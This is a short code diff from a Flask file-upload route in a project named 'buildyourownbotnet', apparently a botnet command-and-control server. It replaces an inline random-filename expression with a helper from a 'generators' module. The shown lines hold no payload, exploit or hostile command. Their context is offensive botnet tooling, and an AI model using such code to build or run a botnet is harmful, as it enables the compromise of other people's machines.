@@ -3,7 +3,7 @@ import base64
 import string
 import random
 from flask import Blueprint, request
-from buildyourownbotnet.core import database
+from buildyourownbotnet.core import database, generators
 
 
 # Blueprint
@@ -46,7 +46,7 @@ def file_add():
 
 	# generate random filename if not specified
 	if not filename:
-		filename = str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]) + filetype
+		filename = generators.variable(length=3) + filetype
 
 	output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)
 
